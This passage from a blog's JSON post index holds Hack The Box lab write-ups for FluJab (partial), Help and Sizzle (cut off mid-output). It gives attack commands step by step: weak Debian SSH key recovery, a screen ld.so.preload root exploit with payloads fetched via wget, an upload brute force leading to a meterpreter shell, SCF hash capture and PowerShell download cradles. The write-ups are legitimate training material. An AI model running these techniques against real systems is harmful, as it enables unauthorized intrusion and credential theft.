AAAAB3NzaC1yc2EAAAABIwAAAgEAqTfCP9e71pkBY+uwbr+IIx1G1r2G1mcjU5GsA42OZCWOKhWg2VNg0aAL+OZLD2YbU/di+cMEvdGZNRxCxaBNtGfMZTTZwjMNKAB7sJFofSwM29SHhuioeEbGU+ul+QZAGlk1x5Ssv+kvJ5/S9vUESXcD4z0jp21CxvKpCGI5K8YfcQybF9/v+k/KkpDJndEkyV7ka/r/IQP4VoCMQnDpCUwRCNoRb/kwqOMz8ViBEsg7odof7jjdOlbBz/F9c/s4nbS69v1xCh/9muUwxCYtOxUlCwaEqm4REf4nN330Gf4I6AJ/yNo2AH3IDpuWuoqtE3a8+zz4wcLmeciKAOyzyoLlXKndXd4Xz4c9aIJ/15kUyOvf058P6NeC2ghtZzVirJbSARvp6reObXYs+0JMdMT71GbIwsjsKddDNP7YS6XG+m6Djz1Xj77QVZbYD8u33fMmL579PRWFXipbjl7sb7NG8ijmnbfeg5H7xGZHM2PrsXt04zpSdsbgPSbNEslB78RC7RCK7s4JtroHlK9WsfH0pdgtPdMUJ+xzv+rL6yKFZSUsYcR0Bot/Ma1k3izKDDTh2mVLehsivWBVI3a/Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE=However after looking for a bit, I found the /etc/ssh/deprecated_keys directory that contains the following files:README.txt has the following message:Copies of compromised keys will be kept here for comparison until all staff have carried out PAM update as per the surgery security notification email.!!! DO NOT RE-USE ANY KEYS LINKED TO THESE !!! UPDATE..All bad priv keys have now been deleted, only pub keys are retained for audit purposes.I remember from my OSCP days that there was a vulnerability in an old Debian release where:  All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected.Debian OpenSSL Predictable PRNGSo basically we just need to look through the repo and find the matching private key for DrNo’s public key.Getting the public key fingerprint:root@ragingunicorn:~/htb/flujab# ssh-keygen -l -E md5 -f 5.pub | tr -d \":\"4096 MD5dead0b5b829ea2e3d22f47a7cbde17a6 drno@flujab.htb (RSA)Finding the matching private key:root@ragingunicorn:~/debian-ssh# ls -lR | grep dead0b5b829ea2e3d22f47a7cbde17a6-rw------- 1 root root 3239 May 14  2008 dead0b5b829ea2e3d22f47a7cbde17a6-23269-rw-r--r-- 1 root root  740 May 14  2008 dead0b5b829ea2e3d22f47a7cbde17a6-23269.pubroot@ragingunicorn:~/debian-ssh# find ./ -name dead0b5b829ea2e3d22f47a7cbde17a6-23269./uncommon_keys/rsa/4096/dead0b5b829ea2e3d22f47a7cbde17a6-23269We still can’t connect to the SSH service though, we need to fix that first. The /etc/ssh/sshd_wl file is a whitelist that can be modified so we can add our IP address.We can then log in with private key from drno:root@ragingunicorn:~/debian-ssh/uncommon_keys/rsa/4096# ssh -i dead0b5b829ea2e3d22f47a7cbde17a6-23269 drno@10.10.10.124Linux flujab 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.rbash: dircolors: command not founddrno@flujab:~$ cat user.txtc519aa...PrivescWe seem to be stuck in a rbash restricted shell, we need to escape that first:drno@flujab:~$ ls -l/user.txtdrno@flujab:~$ cat user.txtc519aa...drno@flujab:~$ cd ..rbash: cd: restrictedEscape is easy with -t bash --norc --noprofile:root@ragingunicorn:~/debian-ssh/uncommon_keys/rsa/4096# ssh -i dead0b5b829ea2e3d22f47a7cbde17a6-23269 drno@10.10.10.124 -t bash --norc --noprofilebash-4.4$ cd /bash-4.4$ ps  PID TTY          TIME CMD 1151 pts/0    00:00:00 bash 1152 pts/0    00:00:00 psbash-4.4$ whoamidrnobash-4.4$ iduid=1000(drno) gid=1000(drno) groups=1000(drno),1002(super),1003(medic),1004(drugs),1005(doctor)Two copies of the screen program were found on the system, the 2nd one is suid so it will execute as root.bash-4.4$ ls -l /usr/bin/screen-rwSr-xr-x 1 root utmp 457608 Dec  9 22:02 /usr/bin/screenbash-4.4$ ls -l /usr/local/share/screen/screen-rwsr-xr-x 1 root root 1543016 Nov 27 13:49 /usr/local/share/screen/screen  ‘S’ = setgid bit is set, but the execute bit isn’t set.‘s’ = setgid bit is set, and the execute bit is set.After checking the version, there is an exploit available for screen:bash-4.4$ /usr/local/share/screen/screen --versionScreen version 4.05.00 (GNU) 10-Dec-16https://www.exploit-db.com/exploits/41154First, we’ll just compile the exploit:root@ragingunicorn:/tmp# gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.cNext, we upload it to the server:bash-4.4$ cd /tmpbash-4.4$ wget 10.10.14.23:4444/rootshell--2019-01-30 03:27:16--  http://10.10.14.23:4444/rootshellConnecting to 10.10.14.23:4444... connected.HTTP request sent, awaiting response... 200 OKLength: 16824 (16K) [application/octet-stream]Saving to: ‘rootshell’rootshell                                              16.43K  --.-KB/s    in 0.008s  2019-01-30 03:27:16 (2.05 MB/s) - ‘rootshell’ saved [16824/16824]bash-4.4$ wget 10.10.14.23:4444/libhax.so--2019-01-30 03:27:25--  http://10.10.14.23:4444/libhax.soConnecting to 10.10.14.23:4444... connected.HTTP request sent, awaiting response... 200 OKLength: 16136 (16K) [application/octet-stream]Saving to: ‘libhax.so’libhax.so                                              15.76K  --.-KB/s    in 0.008s  2019-01-30 03:27:25 (1.94 MB/s) - ‘libhax.so’ saved [16136/16136]bash-4.4$ chmod +x rootshellThen execute it:bash-4.4$ chmod +x rootshellbash-4.4$ cd /etcbash-4.4$ umask 000bash-4.4$ screen -D -m -L ld.so.preload echo -ne  \"\\x0a/tmp/libhax.so\"Directory '/run/screen' must have mode 755.bash-4.4$ screen -lsDirectory '/run/screen' must have mode 755.bash-4.4$ /tmp/rootshell$Uh? No root privileges?Oh… I forgot to use the correct binary in /usr/local/share/screen which is setuid. Let’s try again with the right path:bash-4.4$ /usr/local/share/screen/screen -D -m -L ld.so.preload echo -ne  \"\\x0a/tmp/libhax.so\"bash-4.4$ /usr/local/share/screen/screen -lsNo Sockets found in /tmp/screens/S-drno.bash-4.4$ /tmp/rootshell# iduid=0(root) gid=0(root) groups=0(root),1000(drno),1002(super),1003(medic),1004(drugs),1005(doctor)# cat /root/root.txt70817..."
  },
  
  {
    "title": "Help - Hack The Box",
    "url": "/posts/htb-writeup-help/",
    "categories": "hackthebox, infosec",
    "tags": "linux, php, apache, kernel exploit, helpdeskz",
    "date": "2019-06-08 00:00:00 +0800",
    





    
    "snippet": "Help showed that a small programming mistake in a web application can introduce a critical security vulnerability. In this case, the PHP application errors out when uploading invalid extensions suc...",
    "content": "Help showed that a small programming mistake in a web application can introduce a critical security vulnerability. In this case, the PHP application errors out when uploading invalid extensions such as PHP files but it doesn’t delete the file. Combined with a predictable filename generated based on MD5 of original file + epoch, we can get RCE.Summary  The HelpdeskZ PHP application allows .php file uploads to be stored even though there is an error message saying an invalid file has been uploaded. The PHP code doesn’t clean up the invalid file that has been uploaded.  We can’t simply execute the uploaded file because the filename stored is obfuscated with the MD5 of the original file + the epoch timestamp. We can bruteforce those with an exploit already available.  After getting a shell through RCE using the uploaded file, we execute a kernel exploit for CVE 2017-16995 and gain root access.Blog / Tools used  HelpDeskZ &lt; 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download  Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege EscalationPortscanNot much running on there, it’s a Linux box with few services running:root@ragingunicorn:~# nmap -p- -sC -sV 10.10.10.121Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-19 19:02 ESTNmap scan report for help.htb (10.10.10.121)Host is up (0.030s latency).Not shown: 65532 closed portsPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It works3000/tcp open  http    Node.js Express framework|_http-title: Site doesn't have a title (application/json; charset=utf-8).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWeb enumeration Node.jsThere’s some kind of Node.js application with graphql running on port 3000 but there’s not much we can do with it.Fails:  Tried enumerating ednpoints with wfuzz, didn’t find anything  Once I had access to the server later on I was able to find the graphql endpoint but couldn’t anything special with it other then querying user information which I already access to locally. The username/password shown here was not used anywhere on the box, just a distraction.Web enumeration ApacheThe main page shows the default Ubuntu Apache page:Next, when we run gobuster we find the /support URI:# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -q -t 50 -u http://help.htb/javascript (Status: 301)/server-status (Status: 403)/support (Status: 301)This points to the HelpdeskZ application running on the server.There’s nothing in the Knowledge Base or News section, and we can’t log in because we don’t have credentials.A quick search on Exploit-DB shows there’s a vulnerability related to file uploads:root@ragingunicorn:~# searchsploit helpdeskz------------------------------------------------ Exploit Title  |  Path  | (/usr/share/exploitdb/)------------------------------------------------HelpDeskZ 1.0.2 - Arbitrary File | exploits/php/webapps/40300.pyHelpDeskZ &lt; 1.0.2 - (Authenticated) SQL Injection / Unauthorized File | exploits/php/webapps/41200.py------------------------------------------------Shellcodes: No ResultExploit: https://www.exploit-db.com/exploits/40300Basically, when we upload an attachment in a support ticket, the filename is obfuscated by doing an MD5 checksum of the filename concatenated with the epoch time. Because the code uses an integer for the epoch time (instead of a float), we can bruteforce the values by computing the MD5 value of every filename/time combination from the past few minutes and issue a GET request to the server to find if the filename is correct.Looking the HelpdeskZ code, we can see that the upload folder is /support/uploads/tickets/, this will need to be passed to the exploit script to bruteforce the correct path.We also need to make sure that the time on our computer is set to same time as the server, or close enough so the script will be able to cycle through the epoch time that matches the upload timestamp.# date &amp;&amp; curl -v --head http://help.htb/Sun Jan 20 09:33:00 EST 2019*   Trying 10.10.10.121...* TCP_NODELAY set* Connected to help.htb (10.10.10.121) port 80 (#0)&gt; HEAD / HTTP/1.1&gt; Host: help.htb&gt; User-Agent: curl/7.62.0&gt; Accept: */*&gt; &lt; HTTP/1.1 200 OKHTTP/1.1 200 OK&lt; Date: Sun, 20 Jan 2019 14:32:37 GMTDate: Sun, 20 Jan 2019 14:32:37 GMTFor the reverse shell, we can can use a simple php/meterpreter/reverse_tcp shell and attach it to a support ticket:It seems that some extensions are blacklisted or whitelisted on the server. But if we look at the source code on Github, we notice that even when we get an error message, there is no code that deletes the invalid file. The file is still saved on the server even if we get an error message.To run the exploit, we just give it the upload location and the filename we uploaded:# ./40300.py http://help.htb/support/uploads/tickets/ cmd.phpHelpdeskz v1.0.2 - Unauthenticated shell upload exploitOnce the script hits the right filename, the payload is triggered and we get a shell:msf5 exploit(multi/handler) &gt;[*] Sending encoded stage (51106 bytes) to 10.10.10.121[*] Meterpreter session 1 opened (10.10.14.23:5555 -&gt; 10.10.10.121:35166) at 2019-01-20 09:35:45 -0500Now we can grab the flag and write our SSH key to the user folder so we can log in by SSH after:meterpreter &gt; shellProcess 17138 created.Channel 0 created.cd /home/helpcat user.txtbb8a7b....mkdir .sshecho \"ssh-rsa AAAAB3NzaC1y[...]hscPOtelvd root@ragingunicorn\" &gt;&gt; .ssh/authorized_keysPrivescSince this is a low point box, the priv esc is probably something simple such as kernel exploit.We get a bunch of results when we run the Linux Exploit Suggester[...][+] [CVE-2017-16995] eBPF_verifier   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html   Tags: debian=9,fedora=25|26|27,[ ubuntu=14.04|16.04|17.04 ]   Download URL: https://www.exploit-db.com/download/45010   Comments: CONFIG_BPF_SYSCALL needs to be set &amp;&amp; kernel.unprivileged_bpf_disabled != 1[...]We can exploit CVE 2017-16995 to gain root access. According to the CVE’s description:  The check_alu_op function in kernel/bpf/verifier.c in the Linux kernel through 4.14.8 allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging incorrect sign extension.Exploiting it was easy:help@help:~$ cd /dev/shmhelp@help:/dev/shm$ vi exp.chelp@help:/dev/shm$ gcc -o exp exp.chelp@help:/dev/shm$ ./exptask_struct = ffff880039afd400uidptr = ffff880036b75b04spawning root shellroot@help:/dev/shm# cat /root/root.txtb7fe60..."
  },
  
  {
    "title": "Sizzle - Hack The Box",
    "url": "/posts/htb-writeup-sizzle/",
    "categories": "hackthebox, infosec",
    "tags": "windows, scf, pass-the-hash, meterpreter, port forwarding, winrm, kerberoasting, responder",
    "date": "2019-06-01 00:00:00 +0800",
    





    
    "snippet": "Sizzle was an amazing box that requires using some Windows and Active Directory exploitation techniques such as Kerberoasting to get encrypted hashes from Service Principal Names accounts. The priv...",
    "content": "Sizzle was an amazing box that requires using some Windows and Active Directory exploitation techniques such as Kerberoasting to get encrypted hashes from Service Principal Names accounts. The privesc involves adding a computer to domain then using DCsync to obtain the NTLM hashes from the domain controller and then log on as Administrator to the server using the Pass-The-Hash technique.Summary  Find a writable share and drop an .scf file to capture hashes for user Amanda  Create a certificate for Amanda and log in with WinRM  Use msbuild trick to execute a meterpreter shell on the server  Port forward TCP port 88 locally and kerberoast user mrlky  Join a PC on the domain and execute DCsync to get Administrator hash  PSexec with Pass-The-Hash as AdministratorBlog / Tools used  https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/  http://www.hurryupandwait.io/blog/certificate-password-less-based-authentication-in-winrm  https://jstuyts.github.io/Secure-WinRM-Manual/windows-client-configuration.html  Kerberoast  MimikatzNmapPortscanAs always, Windows boxes have plenty of ports open. One interesting thing here is it seems that the server is a domain controller based on the LDAP and Global Catalog ports being open but we don’t see the TCP port 88 for Kerberos being open. That’ll cause some issues later on when we get to the Kerberoasting part of the box.# nmap -p- 10.10.10.103Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-15 16:23 ESTNmap scan report for sizzle.htb (10.10.10.103)Host is up (0.025s latency).Not shown: 65506 filtered portsPORT      STATE SERVICE21/tcp    open  ftp53/tcp    open  domain80/tcp    open  http135/tcp   open  msrpc139/tcp   open  netbios-ssn389/tcp   open  ldap443/tcp   open  https445/tcp   open  microsoft-ds464/tcp   open  kpasswd5593/tcp   open  http-rpc-epmap636/tcp   open  ldapssl3268/tcp  open  globalcatLDAP3269/tcp  open  globalcatLDAPssl5985/tcp  open  wsman5986/tcp  open  wsmans9389/tcp  open  adws47001/tcp open  winrm49664/tcp open  unknown49665/tcp open  unknown49666/tcp open  unknown49669/tcp open  unknown49679/tcp open  unknown49682/tcp open  unknown49683/tcp open  unknown49684/tcp open  unknown49687/tcp open  unknown49697/tcp open  unknown49709/tcp open  unknown56700/tcp open  unknownFTP enumerationAnonymous access is allowed to the FTP server but there is nothing there. Let’s move on.Web enumerationOn the web site, we only have a picture of some tasty bacon, nothing else.Dirbusting the site shows a /cervsrv directory which is used by the certificate enrollment web service of the Windows Certificate Authority. It is used by clients to request certificates that can be used for applications to authenticate to a server instead of passwords or to complement password authentication.# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -q -u http://10.10.10.103/Images (Status: 301)/aspnet_client (Status: 301)/certenroll (Status: 301)/images (Status: 301)The enrollment service requires authentication and we don’t have credentials for it yet. We’ll get back to that service later.SMB shares enumerationTo list the SMB shares on the server, we can’t use a null session because we get an access denied error.# smbmap -H 10.10.10.103    [+] Finding open SMB ports....[+] User SMB session establishd on 10.10.10.103...[+] IP: 10.10.10.103:445        Name: sizzle.htb                                                Disk                                                    Permissions        ----                                                    -----------[!] Access DeniedBut if we specify any other user that doesn’t exist, it’ll open a guest SMB session and we can see the list of shares. The Department Shares is readable by guest users so this is our next target.# smbmap -u invaliduser -H 10.10.10.103       [+] Finding open SMB ports....[+] Guest SMB session established on 10.10.10.103...[+] IP: 10.10.10.103:445        Name: sizzle.htb                                                Disk                                                    Permissions        ----                                                    -----------        ADMIN$                                                  NO ACCESS        C$                                                      NO ACCESS        CertEnroll                                              NO ACCESS        Department Shares                                       READ ONLY        IPC$                                                    READ ONLY        NETLOGON                                                NO ACCESS        Operations                                              NO ACCESS        SYSVOL                                                  NO ACCESSGetting the Net-NTLMv2 hash from a userWe can use smbclient to log in and look around the share for files of interest.# smbclient -U invaliduser //10.10.10.103/\"Department Shares\"Enter HTB\\invaliduser's password: Try \"help\" to get a list of possible commands.smb: \\&gt; ls  .                                   D        0  Tue Jul  3 11:22:32 2018  ..                                  D        0  Tue Jul  3 11:22:32 2018  Accounting                          D        0  Mon Jul  2 15:21:43 2018  Audit                               D        0  Mon Jul  2 15:14:28 2018  Banking                             D        0  Tue Jul  3 11:22:39 2018  CEO_protected                       D        0  Mon Jul  2 15:15:01 2018  Devops                              D        0  Mon Jul  2 15:19:33 2018  Finance                             D        0  Mon Jul  2 15:11:57 2018  HR                                  D        0  Mon Jul  2 15:16:11 2018  Infosec                             D        0  Mon Jul  2 15:14:24 2018  Infrastructure                      D        0  Mon Jul  2 15:13:59 2018  IT                                  D        0  Mon Jul  2 15:12:04 2018  Legal                               D        0  Mon Jul  2 15:12:09 2018  M&amp;A                                 D        0  Mon Jul  2 15:15:25 2018  Marketing                           D        0  Mon Jul  2 15:14:43 2018  R&amp;D                                 D        0  Mon Jul  2 15:11:47 2018  Sales                               D        0  Mon Jul  2 15:14:37 2018  Security                            D        0  Mon Jul  2 15:21:47 2018  Tax                                 D        0  Mon Jul  2 15:16:54 2018  Users                               D        0  Tue Jul 10 17:39:32 2018  ZZ_ARCHIVE                          D        0  Mon Jul  2 15:32:58 2018                7779839 blocks of size 4096. 2634403 blocks availableIn ZZ_ARCHIVE, there’s a bunch of files with random names:smb: \\ZZ_ARCHIVE\\&gt; dir  .                                   D        0  Mon Jul  2 15:32:58 2018  ..                                  D        0  Mon Jul  2 15:32:58 2018  AddComplete.pptx                    A   419430  Mon Jul  2 15:32:58 2018  AddMerge.ram                        A   419430  Mon Jul  2 15:32:57 2018  ConfirmUnprotect.doc                A   419430  Mon Jul  2 15:32:57 2018  ConvertFromInvoke.mov               A   419430  Mon Jul  2 15:32:57 2018  ConvertJoin.docx                    A   419430  Mon Jul  2 15:32:57 2018  CopyPublish.ogg                     A   419430  Mon Jul  2 15:32:57 2018  DebugMove.mpg                       A   419430  Mon Jul  2 15:32:57 2018  DebugSelect.mpg                     A   419430  Mon Jul  2 15:32:58 2018  DebugUse.pptx                       A   419430  Mon Jul  2 15:32:57 2018[...]However when we check, they are all identical and only contain null bytes.# xxd AddComplete.pptx |more00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................[...]To make sure they are all identical and that none of them contain something hidden, I checked the md5sum of all the files in the directory. The 6fa74ff6dd88878b4b56092a950035f8 MD5 hash is the same for all the files. This is just a troll/diversion, we can ignore these.# md5sum *6fa74ff6dd88878b4b56092a950035f8  AddComplete.pptx6fa74ff6dd88878b4b56092a950035f8  AddMerge.ram6fa74ff6dd88878b4b56092a950035f8  ConfirmUnprotect.doc6fa74ff6dd88878b4b56092a950035f8  ConvertFromInvoke.mov6fa74ff6dd88878b4b56092a950035f8  ConvertJoin.docx6fa74ff6dd88878b4b56092a950035f8  CopyPublish.ogg6fa74ff6dd88878b4b56092a950035f8  DebugMove.mpg6fa74ff6dd88878b4b56092a950035f8  DebugSelect.mpg[...]After trying a few different things, I noticed that the guest user has write access to the ZZ_ARCHIVE and users\\Public folders:dir output from smbclient after enabling showacls, notice the WRITE_OWNER_ACCESS and WRITE_DAC_ACCESS permissions:type: ACCESS ALLOWED (0) flags: 0x03 SEC_ACE_FLAG_OBJECT_INHERIT  SEC_ACE_FLAG_CONTAINER_INHERIT Specific bits: 0x1ffPermissions: 0x1f01ff: SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS SID: S-1-1-0The S-1-1-0 SID is for all users:  SID: S-1-1-0  Name: Everyone  Description: A group that includes all users, even anonymous users and guests. Membership is controlled by the operating system.From the users folder, we can get a list of potential usernames on the box. This could be useful for password spraying if we had a valid password and wanted to try it on different accounts.smb: \\users\\&gt; dir  .                                   D        0  Tue Jul 10 17:39:32 2018  ..                                  D        0  Tue Jul 10 17:39:32 2018  amanda                              D        0  Mon Jul  2 15:18:43 2018  amanda_adm                          D        0  Mon Jul  2 15:19:06 2018  bill                                D        0  Mon Jul  2 15:18:28 2018  bob                                 D        0  Mon Jul  2 15:18:31 2018  chris                               D        0  Mon Jul  2 15:19:14 2018  henry                               D        0  Mon Jul  2 15:18:39 2018  joe                                 D        0  Mon Jul  2 15:18:34 2018  jose                                D        0  Mon Jul  2 15:18:53 2018  lkys37en                            D        0  Tue Jul 10 17:39:04 2018  morgan                              D        0  Mon Jul  2 15:18:48 2018  mrb3n                               D        0  Mon Jul  2 15:19:20 2018  Public                              D        0  Wed Sep 26 01:45:32 2018Because we have write access to the SMB share, we can try to use the SCF (Shell Command Files) technique to make a user connect back to us and get the NTLMv2 hash. This of course assumes that there is some automated script simulating an active user on the box. Fortunately, I did the Offshore pro labs a few days prior to starting that box so I remembered that the SCF trick was used there and because Sizzle is created by the same person I figured he probably used the same trick here.First, we need to create an .scf file that contains a link to an icon file hosted on our Kali machine. The file doesn’t need to exist, we just need to point to our IP so we can get the NTLMv2 hash. Normally we would need to start the file with something like the @ character so the file will appear at the top of the directory listing when the user browses to it but since there are no other files in that Public directory we could use any filename.Contents of @pwn.scf:[Shell]Command=2IconFile=\\\\10.10.14.23\\share\\pwn.ico[Taskbar]Command=ToggleDesktopFile is uploaded to the Public folder.# smbclient -U invaliduser //10.10.10.103/\"Department Shares\"    Try \"help\" to get a list of possible commands.smb: \\&gt; cd users\\publicsmb: \\users\\public\\&gt; put @pwn.scfputting file @pwn.scf as \\users\\public\\@pwn.scf (1.0 kb/s) (average 0.9 kb/s)Then responder is used to catch the connection from the user and get the hash. This takes a few minutes, the simulated user script is probably running in a scheduler task on the server side.# responder -I tun0                                         __[...][+] Listening for events...[SMBv2] NTLMv2-SSP Client   : 10.10.10.103[SMBv2] NTLMv2-SSP Username : HTB\\amanda[SMBv2] NTLMv2-SSP Hash     : amanda::HTB:4c8aa1ec2c7628do we now have an NTLMv2 hash, which we’ll need to crack since we can’t use that type of hash for Pass-The-Hash. With John the Ripper, we use the rockyou.txt wordlist and are able to crack the password.# john -w=/usr/share/wordlists/rockyou.txt --fork=4 amanda.txtUsing default input encoding: UTF-8Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])Node numbers 1-4 of 4 (fork)Press 'q' or Ctrl-C to abort, almost any other key for statusAshare1972       (amanda)1 0g 0:00:00:06 DONE (2019-01-15 22:38) 0g/s 427278p/s 427278c/s 427278C/s ANYBODY2 1g 0:00:00:06 DONE (2019-01-15 22:38) 0.1492g/s 425960p/s 425960c/s 425960C/s Ashare19724 0g 0:00:00:06 DONE (2019-01-15 22:38) 0g/s 427509p/s 427509c/s 427509C/s ANALEIGH2113Waiting for 3 children to terminate3 0g 0:00:00:06 DONE (2019-01-15 22:38) 0g/s 427576p/s 427576c/s 427576C/s AMOPMINHACASAUse the \"--show\" option to display all of the cracked passwords reliablySession completedPassword is: Ashare1972Getting an initial foothold on the serverThe next thing I tried were psexec and wmiexec, none of them worked for this user. We also don’t have any additional privileges on the SMB share, nor can we access anything else on the FTP server.Remember that web enrollment certificate page for earlier? Let’s go back to it and see if we can log in with Amanda’s credentials.Nice, we are now able to log in and we can request a certificate that we will use to authenticate to the server using WinRM. I switched to a Windows VM at that point because I find using WinRM from within Windows Powershell works better than Kali.A Certificate Signing Request (CSR) is created with the following commands (both CSR and private keys are generated):PS C:\\Users\\labuser&gt; openssl req -nodes -newkey rsa:2048 -keyout amanda.key -out amanda.csrGenerating a RSA private key.......+++++.....................................................+++++writing new private key to 'amanda.key'-----You are about to be asked to enter information that will be incorporatedinto your certificate request.What you are about to enter is what is called a Distinguished Name or a DN.There are quite a few fields but you can leave some blankFor some fields there will be a default value,If you enter '.', the field will be left blank.-----Country Name (2 letter code) [AU]:State or Province Name (full name) [Some-State]:Locality Name (eg, city) []:Organization Name (eg, company) [Internet Widgits Pty Ltd]:Organizational Unit Name (eg, section) []:Common Name (e.g. server FQDN or YOUR name) []:AmandaEmail Address []:Please enter the following 'extra' attributesto be sent with your certificate requestA challenge password []:An optional company name []:Then on the certificate web enrollment page, we can copy/paste the content of the CSR.This generates a signed certificate that we will download.The key and signed certificate need to be combined so they can be imported in the Windows certificate store. We take the amanda.key that contains the private key and combine it with certnew.cer which is the signed certificate, and the output is saved to certificate.pfx:PS C:\\Users\\labuser&gt; openssl pkcs12 -export -out certificate.pfx -inkey amanda.key -in certnew.cerEnter Export Password:Verifying - Enter Export Password:The .pfx file is then imported into the Windows cert store. Note that once the certificate is imported, we need to note the thumbprint ID since this is required to log in with WinRM.The certificate part is ready, now we’ll setup the WinRM service and add all hosts to the TrustHosts (we’ll disable certificate validation when we connect anyways).PS C:\\Windows\\system32&gt; winrm quickconfigWinRM is not set up to receive requests on this machine.The following changes must be made:Start the WinRM service.Set the WinRM service type to delayed auto start.Make these changes [y/n]? yWinRM has been updated to receive requests.WinRM service type changed successfully.WinRM service started.WSManFault    Message        ProviderFault            WSManFault                Message = WinRM firewall exception will not work since one of the network connection types on this machine is set to Public. Change the network connection type to either Domain or Private and try again.Error number:  -2144108183 0x80338169WinRM firewall exception will not work since one of the network connection types on this machine is set to Public. Change the network connection type to either Domain or Private and try again.PS C:\\Windows\\system32&gt; get-service winrmStatus   Name               DisplayName------   ----               -----------Running  winrm              Windows Remote Management (WS-Manag...PS C:\\tmp&gt; winrm set winrm/config/client '@{TrustedHosts=\"*\"}'Client    NetworkDelayms = 5000    URLPrefix = wsman    AllowUnencrypted = false    Auth        Basic = false        Digest = false        Kerberos = false        Negotiate = true        Certificate = true        CredSSP = false    DefaultPorts        HTTP = 5985        HTTPS = 5986    TrustedHosts = *  We don’t need to check the CRL and do certificate validation because this is an HTB box, so we can use session options to disable this.PS C:\\Users\\labuser&gt; $sessionOption = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheckPS C:\\Users\\labuser&gt; enter-pssession -ComputerName 10.10.10.103 -SessionOption $sessionOption -CertificateThumbprint 7d8f7b5cbdf16a19a00f0088f1692734b0c3a850[10.10.10.103]: PS C:\\Users\\amanda\\Documents&gt; hostnamesizzle[10.10.10.103]: PS C:\\Users\\amanda\\Documents&gt; whoamihtb\\amanda[10.10.10.103]: PS C:\\Users\\amanda\\Documents&gt;Good, we now have a foothold on the server using WinRM.Escalating to the next userAmanda doesn’t have user.txt in her Desktop, we need to get access as another user next.Listing users on the box, we notice two additional users: sizzler and mrlky:[10.10.10.103]: PS C:\\Users\\amanda&gt; net usersUser accounts for \\\\-------------------------------------------------------------------------------Administrator            amanda                   DefaultAccountGuest                    krbtgt                   mrlkysizzlerThe command completed with one or more errors.When we check the privileges Amanda has, we notice she can add workstations to the domain with SeMachineAccountPrivilege.[10.10.10.103]: PS C:\\Users\\amanda\\Documents&gt; whoami /privPRIVILEGES INFORMATION----------------------Privilege Name                Description                    State============================= ============================== =======SeMachineAccountPrivilege     Add workstations to domain     EnabledSeChangeNotifyPrivilege       Bypass traverse checking       EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledPowerShell constrained language mode is enabled and prevents us from loading additional modules.[10.10.10.103]: PS C:\\Users\\amanda\\Documents&gt; $ExecutionContext.SessionState.LanguageModeConstrainedLanguage[10.10.10.103]: PS C:\\Users\\amanda&gt; IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.23/PowerView.ps1')New-Object : Cannot create type. Only core types are supported in this language mode.At line:1 char:6+ IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.23/Pow ...+      ~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : PermissionDenied: (:) [New-Object], PSNotSupportedException    + FullyQualifiedErrorId : CannotCreateTypeConstrainedLanguage,Microsoft.PowerShell.Commands.NewObjectCommandWe can bypass this by using PowerShell version 2 and we can use PowerView to find an account with an SPN that we will use to Kerberoast:[10.10.10.103]: PS C:\\Users\\amanda\\Documents&gt; powershell -v 2 -ep bypass -command \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.23/PowerView.ps1'); get-domainuser -spn\"[...]objectsid             : S-1-5-21-2379389067-1826974543-3574127760-1603samaccounttype        : USER_OBJECTprimarygroupid        : 513instancetype          : 4badpasswordtime       : 7/12/2018 12:22:42 AMmemberof              : {CN=Remote Management Users,CN=Builtin,DC=HTB,DC=LOCAL, CN=Users,CN=Builti                        n,DC=HTB,DC=LOCAL}whenchanged           : 7/12/2018 4:45:59 AMbadpwdcount           : 0useraccountcontrol    : NORMAL_ACCOUNTname                  : mrlkycodepage              : 0distinguishedname     : CN=mrlky,CN=Users,DC=HTB,DC=LOCALlogoncount            : 68lastlogon             : 7/12/2018 10:23:50 AMserviceprincipalname  : http/sizzleusncreated            : 13068dscorepropagationdata : {7/7/2018 5:28:35 PM, 1/1/1601 12:00:01 AM}lastlogontimestamp    : 7/10/2018 2:14:51 PMcn                    : mrlkypwdlastset            : 7/10/2018 2:08:09 